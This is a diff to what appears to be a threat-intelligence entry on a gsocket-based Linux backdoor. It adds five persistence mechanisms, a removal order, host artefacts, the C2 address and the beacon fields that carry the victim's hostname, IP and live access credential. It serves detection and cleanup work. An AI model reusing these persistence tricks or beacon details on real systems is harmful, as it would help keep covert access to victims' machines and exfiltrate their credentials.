@@ -47,9 +47,48 @@
 # Tooling     : THC Global Socket — legitimate pentest tool providing
 #               NAT-traversing encrypted shells via a public relay network.
 #               Abused here for persistent remote access.
-# Persistence : systemd unit file (chmod 644) + watchdog script (chmod 755)
-# Staging     : $THC_TMPDIR, chmod 700
-# Exfil       : victim public IP POSTed to the operator's own host
+# Persistence : FIVE mechanisms — see [PERSISTENCE] below. An earlier
+#               revision of this feed listed two, which materially
+#               understated the removal effort.
+# Staging     : /tmp/thc_tmp, chmod 700  ($THC_TMPDIR)
+# Exfil       : victim hostname, public IP AND the gs-netcat access
+#               credential POSTed to the operator's own host
+
+# [PERSISTENCE — all five, remove in this order]
+# 1. systemd  /etc/systemd/system/gsocket-watchdog.service
+#             Restart=always, RestartSec=10, StartLimitBurst=0
+# 2. crontab  "* * * * * $HOME/.config/prng/watchdog.sh"
+# 3. crontab  "@reboot sleep 10 && $HOME/.config/prng/watchdog.sh"
+# 4. shell rc injection — ~/.bashrc, ~/.profile, ~/.zshrc, ~/.bash_profile
+#             each gets a "# GSocket Watchdog auto-start" block
+# 5. the watchdog script itself, ~/.config/prng/watchdog.sh
+# THEN kill gs-netcat. Not before.
+#
+# *** KILLING THE PROCESS FIRST MAKES THINGS WORSE ***
+# The watchdog polls every 30 s. If gs-netcat is not running it reinstalls
+# gsocket from https://gsocket.io/y, derives a NEW connection secret, and
+# POSTs that new secret to 192.253.248.9. Killing the process therefore
+# regenerates attacker access and re-notifies the attacker.
+
+# [HOST ARTEFACTS — best single hunt path]
+# ~/.config/prng/                 <- wrapper's own directory; collides with
+#                                    nothing legitimate
+# ~/.config/prng/watchdog.sh      (mode 755)
+# ~/.config/prng/gs_output.log
+# ~/.config/prng/gs_line.txt      <- contains the live access credential
+# ~/.config/prng/thc_cli
+# /tmp/gsocket_watchdog.pid
+# /tmp/gsocket_restart_count.txt
+# /tmp/thc_tmp/                   (mode 700)
+# /etc/systemd/system/gsocket-watchdog.service
+
+# [EXFIL BEACON CONTENTS — victim enumeration value]
+# POST http://192.253.248.9/gsocket/up.php
+#   data = gs-netcat -s "<secret>" -i     <- THE ACCESS CREDENTIAL ITSELF
+#   host = $(hostname)
+#   ip   = $(curl -fsSL -4 ifconfig.me)
+# A collector on this endpoint yields a self-identifying victim census.
+# Treat any captured secret as a live credential to a victim machine.
 # VirusTotal  : 2/60 (downloader.prng/shell) — very low detection for a
 #               fully functional persistent backdoor installer.
 
